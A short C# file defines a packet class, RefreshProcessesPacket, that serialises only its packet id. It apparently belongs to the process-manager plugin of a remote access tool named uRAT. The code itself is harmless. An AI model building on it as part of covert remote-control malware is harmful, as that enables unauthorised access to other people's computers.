﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.ManagersPlugin.ProcessManager.Packets
{
    class RefreshProcessesPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 4; }
        }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
        }

        public void DeserializeFrom(Stream stream)
        {
            throw new NotImplementedException();
        }
    }
}
